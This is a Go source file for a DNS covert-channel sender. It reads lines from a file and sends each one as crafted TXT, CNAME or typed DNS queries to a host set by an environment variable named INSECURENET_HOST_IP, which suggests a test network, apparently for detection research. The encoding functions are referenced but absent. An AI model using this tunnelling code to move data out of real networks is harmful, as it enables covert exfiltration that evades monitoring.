package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

const BASE_DOMAIN = "example.com"

func generateDNSQuery(domain string, qtype layers.DNSType) ([]byte, error) {
	// Generate a random transaction ID
	// Note: For production/better randomness, use crypto/rand or rand.New(rand.NewSource(...))
	transactionID := uint16(rand.Intn(65535)) // Using math/rand for simplicity

	// Create DNS question
	dnsQuestion := layers.DNSQuestion{
		Name:  []byte(domain),
		Type:  qtype, // Use the specified query type (e.g., CNAME)
		Class: layers.DNSClassIN,
	}

	// Create DNS layer
	dns := layers.DNS{
		ID:        transactionID,
		OpCode:    layers.DNSOpCodeQuery,
		RD:        true, // Recursion Desired
		QDCount:   1,    // One question
		Questions: []layers.DNSQuestion{dnsQuestion},
		ANCount:   0, // No answers in a query
		NSCount:   0, // No authorities in a query
		ARCount:   0, // No additional records in a query
	}

	// Serialize DNS layer
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true, // Note: UDP checksums are often optional
	}

	err := dns.SerializeTo(buffer, options)
	if err != nil {
		return nil, fmt.Errorf("error serializing DNS layer: %w", err)
	}

	return buffer.Bytes(), nil
}

func udpSender(
	dnsQueryGenerator func(string) ([][]byte, error),
	message string,
	waitBetween int,
) {
	host := os.Getenv("INSECURENET_HOST_IP")
	port := 53 // DNS port

	if host == "" {
		fmt.Println("INSECURENET_HOST_IP environment variable is not set.")
		return
	}

	// Resolve the address
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		fmt.Printf("Error resolving address: %s\n", err)
		return
	}

	// Create a UDP socket
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		fmt.Printf("Error dialing UDP: %s\n", err)
		return
	}
	defer conn.Close()

	// Generate DNS query
	dnsQueries, err := dnsQueryGenerator(message)

	if err != nil {
		fmt.Printf("Error generating DNS queries: %s\n", err)
		return
	}

	if len(dnsQueries) == 0 {
		fmt.Println("No DNS queries generated.")
		return
	}

	fmt.Println("Sending DNS queries...", len(dnsQueries))

	for i := 0; i < len(dnsQueries); i += 1 {
		// Generate the DNS TXT query packet
		dnsQueryPacket := dnsQueries[i]

		// Send DNS query to the target server
		_, err := conn.Write(dnsQueryPacket)
		for err != nil {
			fmt.Printf("Error sending DNS query: %s\n", err)
			// Retry sending the packet
			_, err = conn.Write(dnsQueryPacket)
		}

		// Wait for a specified duration before sending the next query
		if waitBetween > 0 {
			time.Sleep(time.Duration(waitBetween) * time.Millisecond)
		}

		fmt.Printf("Sent query for: %d.\n", i)
	}
}

func readFileLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" { // Skip empty lines
			lines = append(lines, line)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return lines, nil
}

var COVERT_CHANNEL_GENERATOR_MAP = map[string]func(message string) ([][]byte, error){
	"txt":   generateCovertTXTQueries,
	"cname": generateCovertCNAMEQueries,
	"typed": generateCovertTypeQueries,
}

func main() {
	args := os.Args
	typeArg := args[1]  // covert channel type
	filename := args[2] // covert channel data file
	waitBetween, _ := strconv.Atoi(args[3])

	lines, err := readFileLines(filename)

	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	fmt.Printf("Read %d lines from file %s\n", len(lines), filename)

	// Send each line as a separate message with 2 seconds between them
	for i, line := range lines {
		fmt.Printf("\nSending line %d: %s\n", i+1, line)
		udpSender(COVERT_CHANNEL_GENERATOR_MAP[typeArg], line, waitBetween)

		// Wait 2 seconds before sending the next line (except for the last line)
		if i < len(lines)-1 {
			fmt.Println("Waiting 2 seconds before sending next line...")
			time.Sleep(2 * time.Second)
		}
	}

	fmt.Println("All lines sent successfully!")
}
